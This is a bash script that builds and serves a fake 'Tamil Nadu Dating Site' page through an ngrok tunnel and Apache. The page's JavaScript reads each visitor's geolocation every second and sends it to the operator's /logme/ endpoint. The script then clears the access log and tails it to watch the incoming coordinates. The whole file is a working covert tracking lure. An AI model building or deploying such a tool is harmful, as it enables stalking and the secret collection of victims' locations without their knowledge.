#!/bin/bash

#64_bit
#xterm -e ./ngrok http 80 & clear

#32_Bit
xterm -e ./ngrok http 80 & clear


echo "            

 __                   .__                                                 
|  | _______   ___  __|__| ___.__._____   _______ _____     ______ __ __  
|  |/ /\__  \  \  \/ /|  |<   |  |\__  \  \_  __ \\__  \   /  ___/|  |  \ 
|    <  / __ \_ \   / |  | \___  | / __ \_ |  | \/ / __ \_ \___ \ |  |  / 
|__|_ \(____  /  \_/  |__| / ____|(____  / |__|   (____  //____  >|____/  
     \/     \/             \/          \/              \/      \/         
                 .__      __            .__                      __       
   __ __ _______ |  |   _/  |_   ____   |  |__  _____     ____  |  | __   
  |  |  \\_  __ \|  |   \   __\ /  _ \  |  |  \ \__  \  _/ ___\ |  |/ /   
  |  |  / |  | \/|  |__  |  |  (  <_> ) |   Y  \ / __ \_\  \___ |    <    
  |____/  |__|   |____/  |__|   \____/  |___|  /(____  / \___  >|__|_ \   
                                             \/      \/      \/      \/   


                                                                     "
sleep 5
read -p '           URL: ' varurl
echo "<!DOCTYPE html>

<html>
    <head>
        <title>Dating in Tamil Nadu
Tamil Nadu Dating Site</title>
        <style type=\"text/css\">
            
            body {
                background-image: url(\"kavi.png\");
                background-size: auto;
                background-repeat: no-repeat;
            }

        </style>
    </head>
    <body>

        <script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js\" type='text/javascript' ></script>
        <script type='text/javascript'>
        function httpGet(theUrl)
        {
            var xmlHttp = new XMLHttpRequest();
            xmlHttp.open( \"GET\", theUrl, false ); // false for synchronous request
            xmlHttp.send( null );
            return xmlHttp.responseText;
        }


        function autoUpdate() {
          navigator.geolocation.getCurrentPosition(function(position) {
            coords = position.coords.latitude + \",\" + position.coords.longitude;
             url = \""$varurl"/logme/\" + coords;
            httpGet(url);
            console.log('should be working');
            setTimeout(autoUpdate, 1000);
        })
        };
        \$(document).ready(function(){
           autoUpdate();
        });

        </script>
    </body>
</html>" > index.html

mv index.html /var/www/html/index.html
cp kavi.png /var/www/html/kavi.png
service apache2 start
echo "        



















 __                   .__                                                 
|  | _______   ___  __|__| ___.__._____   _______ _____     ______ __ __  
|  |/ /\__  \  \  \/ /|  |<   |  |\__  \  \_  __ \\__  \   /  ___/|  |  \ 
|    <  / __ \_ \   / |  | \___  | / __ \_ |  | \/ / __ \_ \___ \ |  |  / 
|__|_ \(____  /  \_/  |__| / ____|(____  / |__|   (____  //____  >|____/  
     \/     \/             \/          \/              \/      \/         
                 .__      __            .__                      __       
   __ __ _______ |  |   _/  |_   ____   |  |__  _____     ____  |  | __   
  |  |  \\_  __ \|  |   \   __\ /  _ \  |  |  \ \__  \  _/ ___\ |  |/ /   
  |  |  / |  | \/|  |__  |  |  (  <_> ) |   Y  \ / __ \_\  \___ |    <    
  |____/  |__|   |____/  |__|   \____/  |___|  /(____  / \___  >|__|_ \   
                                             \/      \/      \/      \/   

                                                                          " > /var/log/apache2/access.log
xterm -e tail -f /var/log/apache2/access.log &
clear
exit
